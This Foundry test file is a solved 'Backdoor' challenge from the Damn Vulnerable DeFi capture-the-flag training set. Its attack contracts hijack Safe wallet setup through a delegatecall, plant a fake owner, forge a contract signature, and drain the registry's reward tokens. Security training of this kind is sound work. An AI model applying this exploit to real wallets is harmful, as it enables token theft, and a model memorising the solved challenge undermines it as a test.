// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {Enum} from "safe-smart-account/contracts/common/Enum.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ISignatureValidator} from "safe-smart-account/contracts/interfaces/ISignatureValidator.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        new AttackEntryPoint(recovery, users, singletonCopy, walletFactory, walletRegistry);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract MaliciousSetupContract is Safe, ISignatureValidator {
    function maliciousSetup(address fakeOwner) external {
        owners[fakeOwner] = address(0xBEEF);
    }

    function isValidSignature(bytes memory, bytes memory) public pure override returns (bytes4) {
        return EIP1271_MAGIC_VALUE;
    }
}

contract MaliciousSafeOwner is ISignatureValidator {
    function isValidSignature(bytes memory, bytes memory) public pure override returns (bytes4) {
        return EIP1271_MAGIC_VALUE;
    }
}

contract AttackEntryPoint {
    constructor(
        address recovery,
        address[] memory users,
        Safe singletonCopy,
        SafeProxyFactory walletFactory,
        WalletRegistry walletRegistry
    ) {
        MaliciousSetupContract setupContract = new MaliciousSetupContract();
        MaliciousSafeOwner safeOwner = new MaliciousSafeOwner();
        bytes memory setupCall = abi.encodeWithSelector(setupContract.maliciousSetup.selector, address(safeOwner));
        bytes memory tokenTransferData = abi.encodeWithSelector(IERC20.transfer.selector, recovery, 10e18);
        address[] memory safeOwners = new address[](1);
        Safe safe;
        bytes memory txSig;

        for (uint256 i = 0; i < users.length; i++) {
            safeOwners[0] = users[i];
            bytes memory safeInitializer = abi.encodeWithSelector(
                singletonCopy.setup.selector,
                safeOwners,
                1, // threshold
                setupContract, // delegate call to this
                setupCall, // delegate call data
                address(0), // fallback handler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );
            safe = Safe(
                payable(
                    address(
                        walletFactory.createProxyWithCallback(address(singletonCopy), safeInitializer, 0, walletRegistry)
                    )
                )
            );
            txSig = abi.encodePacked(
                bytes32(uint256(uint160(address(safeOwner)))), bytes32(uint256(65)), uint8(0), // actual signature
                bytes32(""), bytes32(""), uint8(0) // dummy value to increase the length
            );

            safe.execTransaction(
                address(walletRegistry.token()),
                0, // value
                tokenTransferData,
                Enum.Operation.Call, // use call (not delegate call)
                0, // safeTxGas (unused)
                0, // baseGas (unused)
                0, // gasPrice (unused)
                address(0), // gasToken (unused)
                payable(address(0)), // refundReceiver (unused)
                txSig
            );
        }
    }
}
